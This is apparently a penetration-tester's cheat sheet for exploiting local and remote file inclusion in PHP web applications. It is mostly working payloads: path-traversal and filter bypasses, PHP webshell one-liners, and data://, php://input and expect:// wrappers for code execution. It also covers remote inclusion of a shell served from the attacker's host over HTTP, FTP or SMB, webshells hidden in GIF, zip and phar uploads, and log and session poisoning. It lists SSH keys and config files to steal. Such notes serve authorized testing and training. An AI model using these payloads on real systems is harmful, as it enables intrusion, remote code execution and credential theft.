# File Inclusion — LFI / RFI

---

## What You're Looking For

Any parameter that loads content — `?page=about`, `?language=es`, `?file=home`, `?view=dashboard`. These feed into `include()`, `require()`, `file_get_contents()`, `fs.readFile()`, `import`, `Response.WriteFile()` — the language doesn't matter, the concept is the same. The critical distinction is whether the function can execute code or only read it. PHP's `include()` and `require()` execute and support remote URLs. `file_get_contents()` reads but won't execute. Node's `res.render()` executes. Java's `import` executes and supports remote. If it executes, RCE is reachable. If it only reads, you're hunting source code and credentials.

---

## Basic LFI

No prefix, no suffix, raw input into the function — absolute path works directly:

```
?language=/etc/passwd
?language=C:\Windows\boot.ini
```

When the app prepends a directory (`./languages/<input>`) you need to traverse out:

```
?language=../../../../etc/passwd
```

Extra `../` past the root never breaks anything — you stay at `/`. If you don't know the depth, use ten of them. When you do know — `/var/www/html/` is three levels deep, so `../../../` is the minimum.

When a string prefix is appended (`lang_<input>`) lead with `/` to treat the prefix as a directory:

```
?language=/../../../etc/passwd
```

When an extension is appended (`<input>.php`) you're restricted to reading PHP files with modern PHP unless you hit an older server — null byte and truncation are your options there.

Second-order attacks matter too — if you can set a username or profile field to `../../../etc/passwd` and a different app function later loads a file based on that stored value, same vulnerability, just triggered indirectly.

---

## Filter Bypasses

**Non-recursive `str_replace('../', '', $input)`** runs once. Nest it so stripping `../` leaves another:

```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/etc/passwd
```

**Character blacklist** (dots or slashes blocked) — URL encode everything including dots:

```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

Double encode for WAFs: `%252e%252e%252f` decodes to `%2e%2e%2f` decodes to `../`. Run it through Burp Decoder twice.

**Approved path regex** like `preg_match('/^\.\/languages\/.+$/', $input)` — start with the approved prefix then traverse out:

```
?language=./languages/../../../../etc/passwd
```

**Null byte** (PHP < 5.5):

```
?language=/etc/passwd%00
```

The `.php` extension lives after `%00` and gets cut. String terminates at the null byte.

**Path truncation** (PHP < 5.3, 4096 char limit) — generate the payload:

```bash
echo -n "nonexistent/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

At 4096 chars the appended `.php` gets dropped. Need a non-existing directory at the start for this to work.

---

## PHP Filters — Source Disclosure

When PHP includes a `.php` file it executes it, giving you nothing or blank output. The base64 filter encodes before execution so you receive the raw source instead. Fuzz for PHP files first — scan all status codes including 301, 302, 403 since LFI reads them regardless:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://<IP>:<PORT>/FUZZ.php
```

Read source with the filter — the app auto-appends `.php` so leave it off the resource name:

```
?language=php://filter/read=convert.base64-encode/resource=config
```

Decode:

```bash
echo 'PD9waHAK...' | base64 -d
```

Read the source, find more file references, follow them, map the whole app. `config.php` almost always has database credentials. `.ini` files work the same way — base64 filter handles them too.

Check `allow_url_include` before trying wrappers — read the PHP config through LFI first:

```bash
curl "http://<IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
echo '<BASE64>' | base64 -d | grep allow_url_include
echo '<BASE64>' | base64 -d | grep expect
```

Try `/etc/php/7.4/apache2/php.ini`, `/etc/php/8.0/apache2/php.ini`, `/etc/php/7.4/fpm/php.ini` — iterate versions.

---

## PHP Wrappers — RCE

**data://** needs `allow_url_include = On`:

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

curl -s 'http://<IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

**php://input** needs `allow_url_include = On` and POST accepted:

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://<IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

If the function only takes POST, hardcode the command directly — `<?php system('id'); ?>`.

**expect://** is an external module, rarely present. If `extension=expect` shows in php.ini confirm it works:

```bash
curl -s "http://<IP>:<PORT>/index.php?language=expect://id" | grep uid
```

---

## RFI — Remote File Inclusion

Verify first — include localhost, if it renders you have RFI. Never include the vulnerable page itself or you get a recursive loop:

```
?language=http://127.0.0.1:80/index.php
```

**HTTP** — port 80 or 443, more likely whitelisted through firewalls:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server 80

?language=http://<OUR_IP>/shell.php&cmd=id
```

**FTP** — useful when WAF blocks `http://` string or port 80 is filtered outbound:

```bash
sudo python -m pyftpdlib -p 21

?language=ftp://<OUR_IP>/shell.php&cmd=id
?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id
```

**SMB** — Windows targets only, no `allow_url_include` needed at all. Windows treats UNC paths as local files:

```bash
impacket-smbserver -smb2support share $(pwd)

?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

---

## LFI + File Uploads

The upload form doesn't need to be vulnerable — just accepting files. If the LFI function executes, it runs whatever PHP is inside regardless of extension.

GIF magic bytes are ASCII so they're trivial to prepend and won't break anything:

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Upload it through the profile image or any upload form. Find the path from page source after upload — look for `src=` pointing at your file. Then include it:

```
?language=./profile_images/shell.gif&cmd=id
```

If LFI has a prefix directory, traverse out first: `../../profile_images/shell.gif`.

**zip://** wrapper (not enabled by default, worth trying):

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

`%23` is `#` URL encoded.

**phar://** wrapper — compile then upload:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

`%2F` is `/` URL encoded.

Fallback order: image upload → zip → phar. Image with GIF bytes is the most reliable.

---

## Log Poisoning

Write PHP into a field you control that gets logged. Include the log. App executes the PHP inside.

**Session Poisoning** — check your PHPSESSID cookie, find the session file through LFI:

```
?language=/var/lib/php/sessions/sess_<PHPSESSID>
# Windows: C:\Windows\Temp\sess_<value>
```

Confirm you control a value inside it by sending a test string and re-reading the file. Then poison with URL-encoded webshell:

```
?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Execute:

```
?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
```

Session file overwrites every request — re-poison before each command, or immediately write a persistent shell to disk on first execution.

**Apache/Nginx Log Poisoning** — Nginx readable by `www-data` by default. Apache needs root/adm group, older installs may be misconfigured. Verify first:

```
?language=/var/log/apache2/access.log
?language=/var/log/nginx/access.log
```

Poison User-Agent — every request gets logged, not just the LFI one:

```bash
curl -s "http://<IP>:<PORT>/index.php" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
```

Then include the log and execute:

```
?language=/var/log/apache2/access.log&cmd=id
```

Other poisonable log files worth trying: `/var/log/sshd.log` (SSH login with PHP as username), `/var/log/mail` (send email with PHP body), `/var/log/vsftpd.log` (FTP login with PHP username), `/proc/self/environ` (User-Agent header appears here), `/proc/self/fd/0` through `/proc/self/fd/50`.

---

## Automated Scanning

Fuzz hidden parameters — forms are tested, hidden params often aren't:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?FUZZ=value' -fs <BASELINE>
```

Spray LFI payloads with LFI-Jhaddix.txt — covers bypasses and common files in one list:

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?language=FUZZ' -fs <BASELINE>
```

Find webroot path — needed when you uploaded a file and can't find it via relative paths:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs <BASELINE>
```

Find server configs and log locations with LFI-WordList-Linux (not in seclists, download separately):

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?language=../../../../FUZZ' -fs <BASELINE>
```

After finding configs, chain them — read `apache2.conf` to find the log path variable, read `envvars` to resolve the variable:

```bash
curl "http://<IP>/<vuln>?language=../../../../etc/apache2/apache2.conf"
# Shows: CustomLog ${APACHE_LOG_DIR}/access.log
# APACHE_LOG_DIR is a variable

curl "http://<IP>/<vuln>?language=../../../../etc/apache2/envvars"
# Shows: export APACHE_LOG_DIR=/var/log/apache2
# Full path: /var/log/apache2/access.log
```

---

## Sensitive Files Worth Hitting

`/etc/passwd` for usernames and home dirs, `/home/<user>/.ssh/id_rsa` for SSH keys, `/root/.ssh/id_rsa` if readable, `/proc/self/environ` for environment variables that may contain secrets, `/var/www/html/config.php` or `database.php` or `settings.php` for DB creds, `/etc/apache2/apache2.conf` and `/etc/apache2/envvars` for webroot and log paths, `/etc/nginx/nginx.conf` for Nginx equivalent, `/etc/php/7.4/apache2/php.ini` for `allow_url_include` and `expect` checks, `/var/lib/php/sessions/sess_<ID>` for session poisoning.

---

## Resources

SecLists LFI wordlists — `/opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`

SecLists parameter names — `/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt`

SecLists webroot paths — `/opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt`

SecLists content types — `/opt/useful/seclists/Discovery/Web-Content/web-all-content-types.txt`

PayloadsAllTheThings LFI section — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion